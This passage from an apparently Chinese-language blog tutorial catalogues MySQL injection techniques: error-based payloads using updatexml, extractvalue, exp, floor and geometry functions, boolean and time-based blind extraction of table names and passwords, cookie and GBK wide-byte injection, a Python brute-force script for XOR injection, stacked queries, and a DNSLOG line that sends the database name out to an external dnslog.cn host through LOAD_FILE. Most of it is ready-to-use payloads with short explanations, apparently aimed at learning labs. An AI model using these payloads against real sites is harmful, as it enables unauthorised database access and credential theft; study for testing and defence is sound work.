class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查列名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查字段</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select user from security.users),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select user from security.users),0x7E));</span><br></pre></td></tr></table></figure><p>注意由于updatexml() 函数的报错内容长度不能超过32个字符，所以常常配合limit分页获取所有字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,2)),3)</span><br><span class="line">//第一个参数表示跳过一条记录，第二个参数表示返回两条记录，即从第二条开始返回两条记录</span><br></pre></td></tr></table></figure><p>或者利用substr()截取字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user) from mysql.user),1,31)),3)</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p><code>exp()</code>:以e为底的指数函数</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>其中~0表示对0进行按位取反，原理就是<strong>对0取反后会得到最大的BIGINT值，利用他进行报错</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select 1,2,exp(~(select * from (select database())a))--+</span><br></pre></td></tr></table></figure><blockquote><p>由于将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的<strong>无符号BIGINT值</strong>。<br>通过子查询与按位取反，造成一个<strong>DOUBLE overflow error</strong>，并借由此注出数据。</p></blockquote><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p><code>floor()</code>:向下取整</p><p><code>count()</code>：返回当前列的数量</p><p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p><p>原理就是利用MySQL的<code>GROUP BY</code>与<code>rand()</code>函数的主键冲突特性，通过故意构造重复的临时表键值，触发报错并泄露敏感信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(database()),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br></pre></td></tr></table></figure><p>在上面的payload中，<code>select concat(0x23,(database()),0x23,floor(rand(0)*2))</code>拼接当前数据库名和随机数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#testdb#1</span><br></pre></td></tr></table></figure><p>简化下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), x from information_schema.columns group by x</span><br></pre></td></tr></table></figure><p><code>group by x</code>会按字段<code>x</code>分组统计，MySQL会为每个唯一<code>x</code>创建临时表，而我们插入临时表时，x的值被计算了<strong>两次</strong>（<strong>一次用于分组，一次用于插入</strong>），但由于<code>floor(rand(0)*2)</code>的不确定性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT floor(rand(0)*2) FROM ...; </span><br><span class="line">-- 序列：0,1,1,0,1,1,1,...</span><br></pre></td></tr></table></figure><p>此时会导致两次计算结果可能不同，而当插入的值与已有主键冲突时，<strong>MySQL抛出错误并泄露当前计算值</strong>。</p><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><p><code>geometrycollection()</code>：用于创建一个几何集合对象，包含多个几何类型的元素。如果传入的参数不符合几何类型的规范，MySQL会抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select geometrycollection((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select geometrycollection((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><p>原理：参数不符合多点几何格式（如字符串代替坐标）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multipoint((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multipoint((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><p>原理：参数非闭合多边形坐标格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select polygon((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select polygon((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><p>原理：参数不符合多线几何格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multilinestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multilinestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><p>原理类似于前面的多边形函数，<code>linestring()</code> 是 MySQL 中用于处理 <strong>线几何对象（LineString）</strong> 的空间函数，要求参数必须为有效的点坐标序列（如 <code>POINT(x,y)</code>）。当传入非法参数（如字符串、子查询结果等）时，MySQL 会抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select linestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select linestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注：当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果的情况。</p><p>原理：通过SQL注入，利用返回的True或False来判断注入语句是否执行成功。</p><p>适用情况：</p><ul><li><p><strong>该输入框存在注入点</strong>。 </p></li><li><p><strong>该页面或请求不会回显注入语句执行结果，故无法使用union注入</strong>。 </p></li><li><p><strong>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入</strong></p></li></ul><p>常用函数：</p><ul><li>length() 返回字符串的长度，例如可以返回数据库名字的长度 。 </li><li>substr() ⽤来截取字符串  。</li><li>ascii() 返回字符的ascii码 。</li><li>sleep(n) 将程序挂起⼀段时间，n为n秒。 </li><li>if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句。</li><li>count()：返回当前列的数量</li></ul><p>一般流程：</p><ul><li><p><strong>判断数据库个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.schemata)&gt;6</span><br></pre></td></tr></table></figure></li><li><p><strong>判断数据库名的长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and length(database())&gt;11  #回显正常</span><br><span class="line">and length(database())&gt;12  #回显错误</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测数据库名（使用ascii码来依次判断）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断指定数据库中有多少个表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.tables where table_schema=&#x27;demo&#x27;)&gt;4</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=&#x27;demo&#x27;)</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=&#x27;user&#x27; limit 0,1)1,1)&gt;105 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测字段内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from demo.user limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>适用情况：页面不会返回错误信息，只会回显一种界面。</p><p>原理：通过与if(expr1,expr2,expr3)语句结合使用，利用sleep函数，制造时间延迟，由回显时间来判断是否报错。</p><p>流程：</p><ul><li><p><strong>判断注入类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1)#</span><br><span class="line"></span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#判断表个数</span><br><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)# </span><br><span class="line"></span><br><span class="line">#获取第一个表名长度</span><br><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">1&#x27; and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = &#x27;dvwa&#x27; limit 1) &gt;= 100 and sleep(5)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#列个数</span><br><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;guestbook&#x27;)=3,sleep(5),1) # </span><br><span class="line"></span><br><span class="line">#列长度</span><br><span class="line">1&#x27; and if(length((select column_name from information_schema.columns where table_name= &#x27;guestbook&#x27; limit 0,1))=10,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#列名</span><br><span class="line">1&#x27; and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = &#x27;guestbook&#x27; limit 0,1) &gt;= 100, sleep(5), 1) #</span><br></pre></td></tr></table></figure></li><li><p><strong>获取字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select ascii(substr((select password from security.users limit 0,1),1,1))&gt;=100),sleep(5),1)#</span><br></pre></td></tr></table></figure></li></ul><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：</p><p>ASP脚本中的request对象被用于从用户那里获取信息。</p><p><strong>而request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</strong></p><blockquote><p>获取从表单中提交的数据：request.form(“参数名称”)</p></blockquote><p><strong>但ASP中规定也可以省略集合名称：request(“参数名称”)，</strong>当使用这样的方式获取数据时，ASP规定按<code>QueryString、Form、Cookie、ServerVariables</code>的顺序来获取数据的。<strong>这样在request.cookies(“参数名称”)提交的数据没进行过滤时就可能存在Cookie注入</strong></p><p>条件：</p><ul><li>对get和post提交的数据进行了过滤，但<strong>未对cookie提交的数据库进行过滤</strong></li><li><strong>程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方式进行获取</strong></li></ul><p>流程：</p><ul><li><p><strong>寻找参数位置</strong></p><p>如?id&#x3D;xx这样带参数</p></li><li><p><strong>去掉参数，观察参数影响</strong></p><p>将id&#x3D;xx删掉，看页面是否正常，正常则说明参数不起影响</p></li><li><p><strong>(先清空网址)输入”javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx”));”</strong></p><p>弹出对话框后重新输入原来UR如果正常就说明<strong>以request(“id”)方式获取数据</strong></p><blockquote><p><strong>document.cookie</strong>:用于设置或获取当前cookie值，在这里是设置</p><p><strong>escape():对字符串进行编码</strong></p></blockquote></li><li><p><strong>判断是否存在漏洞</strong></p><p>带入SQL判断语句:</p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;1”));</strong></p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;2”));</strong></p><p><strong>若第一个正常，第二个不正常，则存在注入漏洞</strong></p></li><li><p><strong>cookie注入</strong></p><p>构造payload：</p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx order by 2”));</strong></p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,database(),2”));</strong></p><blockquote><p><strong>可以burp抓包修改id值，就不用alert弹窗了，但要将值进行次url编码</strong></p><p><strong>当然除了联合注入也可以用其他注入方式</strong></p></blockquote></li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符、字符集</strong></p><p>字符是组成字符集的基本单位。对字符赋予一个数值来确定这个字符在该字符集中的位置</p><p><strong>UTF8</strong></p><p><strong>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，即UTF(Universal Transformation Format)。</strong></p><p><strong>宽字节</strong></p><p><strong>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，称为宽字节</strong></p><ul><li><strong>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节</strong></li><li><strong>英文默认占一个字节，中文占两个字节</strong></li></ul><p><strong>原理</strong></p><p>由于MySQL设置了转义函数，使<strong>输入的函数增添了<code>\</code>转义</strong>，而<strong>GBK占用两字节，ASCII占用一字节</strong></p><p>PHP中编码为UTF-8,函数执行添加的是ASCII编码（<code>\</code>),MySQL默认字符集是GBK等宽字符集</p><p><strong>由于<code>\</code>url转义编码是%5c，而<code>%df&#39;</code>转义后为<code>%df\&#39;</code>,即<code>%df%5c%27</code>,GBK宽字节编码会认为<code>%df%5c</code>是一个宽字节，即<code>運&#39;</code>,从而绕过</strong></p><p>流程：**<code>%df%27 浏览器url自动解码===&gt; β\&#39; 转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#39;</code>**</p><blockquote><p>常见转义函数即配置：<strong>addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc的配置</strong></p></blockquote><p><strong>条件</strong></p><ul><li><strong>首先要满足目标程序使用双&#x2F;多字节字符集进行解析</strong></li><li><strong>其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</strong></li></ul><p><strong>GET传参的宽字节注入</strong></p><p><strong>在引号前面加个<code>%df</code>即可,之后进行正常的注入</strong></p><p><strong>POST传参的宽字节注入</strong></p><p><strong>需要借助burp抓包改包</strong></p><ul><li><strong>正常写入注入语句 ，一般是在引号前写一个字符，并知道此字符对应的ascii码值，方便在包里找到输入数据 ，我比较喜欢用小写a &gt;&gt;&gt;a对应的ascii码值是61</strong></li><li><strong>burp抓包，找到引号前的字符即a，修改其<code>Hex</code>为<code>df</code>即可，后面流程一样</strong></li></ul><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>原理：通过在构造where后面的判断条件时使用<strong>^（异或符号）或<code>xor</code><strong>来达到sql注入攻击的目的，运算法则是：</strong>两个条件相同（同真或同假）即为假<code>（0）</code>，两个条件不同即为真<code>（1）</code>，<code>null</code>与任何条件做异或运算都为<code>null</code></strong></p><p>因为异或逻辑通常返回的是1和0，所以一般用于<strong>盲注</strong>中。</p><p>应用场景是过滤了union select and or 等一些关键字。还能绕过空格过滤。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://test_url/?id=2&#x27;^&quot;</span></span><br><span class="line">keyword = <span class="string">&quot;keyword&quot;</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            <span class="built_in">print</span>(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result = &quot;</span> + string)</span><br></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>顾名思义，堆叠注入就是将语句堆叠在一起进行查询，因为<strong>mysql_multi_query()</strong> 支持<strong>多条sql语句同时执行</strong>，但需要<strong>以<code>;</code>分隔开</strong>。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure><p>而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<strong>union 或者union all 执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句.</strong></p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>有注入点：即存在sql注入漏洞</p><p>未过滤：即<strong>未对”;”号进行过滤</strong></p><p>未禁用：即<strong>未禁止执行多条sql语句</strong></p><h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行</p><p>但实际情况中，PHP为了<strong>防止sql注入机制</strong>，往往使用调用数据库的函数是<strong>mysqli_ query()函数</strong>，其<strong>只能执行一条语句</strong>，分号后面的内容将不会被执行</p><p>mysqli_query()函数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($connection, $query);</span><br><span class="line"> </span><br><span class="line">//$connection：表示与MySQL服务器的连接，可以通过mysqli_connect()函数进行创建。</span><br><span class="line">//$query：表示要执行的SQL查询语句。</span><br></pre></td></tr></table></figure><h3 id="DNSLOG外带注入"><a href="#DNSLOG外带注入" class="headerlink" title="DNSLOG外带注入"></a>DNSLOG外带注入</h3><p>目标站点没有回显，不知道是否利用成功时，就需要DNSLOG注入，即盲注</p><p>Windows中允许使用UNC路径访问网络 <code>\\计算机名或IP地址\共享名称\路径</code></p><p>利用前提：</p><ol><li><strong><code>secure_file_priv=</code>值为空</strong></li><li><strong>目标出网</strong></li><li><strong>有文件读取写入的权限，例如root</strong></li></ol><p>在数据库中执行以下命令，查看DNSLOG平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;\\\\fekvlt.dnslog.cn\\aa&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/image-20241007143442024.png"></p><p>将要查询的内容带出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(select database()),&#x27;.fekvlt.dnslog.cn\\a&#x27;));</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在SQL绕过中也提及了在 <strong>mysql &#x3D;&gt; 5</strong> 的版本中存在库<strong>information_schema</strong>,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过<strong>此库中的表去获取其他表的结构，即表名，列名等</strong>。但是这个库也会经常被WAF过滤。</p><p>而当<strong>information_schema</strong>库被过滤时我们需要用到**InnoDB 引擎表中的<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code><strong>或</strong>sys库中<code>sys.schema_auto_increment_columns</code>和<code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code>**来获取库名和表名，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>**<code>sys.schema_auto_increment_columns</code>**用于那些有自增字段表的数据库的信息</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>**<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>**用于那些没有自增字段表的数据库的信息</p></blockquote><p>但上面几种查询方法都有一个致命的缺点就是只能查到库名和表名，不能得到完整的字段名，这时就需要无列名注入。</p><ul><li><h4 id="union联合-子查询"><a href="#union联合-子查询" class="headerlink" title="union联合+子查询"></a><strong>union联合+子查询</strong></h4><p>正常情况下的SQL查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-192953.png"></p><p>可以看到列名为a,b,使用union联合查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select * from test;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-193151.png"></p><p>可以看到我们的列名被替换成了对应的数字，也就是说我们可以继续数字来对应列，如对应b:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2` from (select 1,2 union select * from test)a;</span><br></pre></td></tr></table></figure><blockquote><p>其中**<code>2</code>用反引号是为了标识列名，如果不标识则2只是一个数字字面量而不是列名会报错，也可以<code>a.2</code>标识列<strong>，而</strong>a是对子查询的一个命名，可以为任意字符但不能没有**</p></blockquote><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-193623.png"></p><p>而多数情况&#96;会被过滤。当 &#96;&#96;不能使用的时候，可使用<strong>别名</strong>来代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b union select * from test)a;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-194128.png"></p><p>同样我们可以查多个列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(`1`,0x2d,`2`) from(select 1,2 union select * from test)</span><br><span class="line">a;</span><br></pre></td></tr></table></figure><p><img 